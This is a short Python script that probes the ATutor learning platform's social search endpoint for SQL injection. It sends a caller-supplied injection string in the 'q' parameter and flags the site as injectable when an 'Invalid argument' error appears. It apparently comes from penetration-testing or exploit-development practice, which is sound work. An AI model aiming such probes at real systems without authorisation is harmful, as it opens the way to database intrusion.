import re
import requests
import argparse
from bs4 import BeautifulSoup

def searchFriends_sqli(ip, inj_str):
    target = f'http://{ip}/ATutor/mods/_standard/social/index_public.php?q={inj_str}'
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')
    result = {}
    error = re.search("Invalid argument", s.text)
    if error:
        result['injection'] = 'Possible'
    else:
        result['injection'] = 'Not injectible'
    result['header'] = r.headers
    result['text'] = s.text
    return result

def main():
    parser = argparse.ArgumentParser(description='Check for SQL Injection.')
    parser.add_argument('-i', '--ip', type=str, help='ip address or FQDN')
    parser.add_argument('-s', '--string', type=str, help='injection string')

    args = parser.parse_args()
    result = searchFriends_sqli(args.ip, args.string)
    print(result)

if __name__=="__main__":
    main()


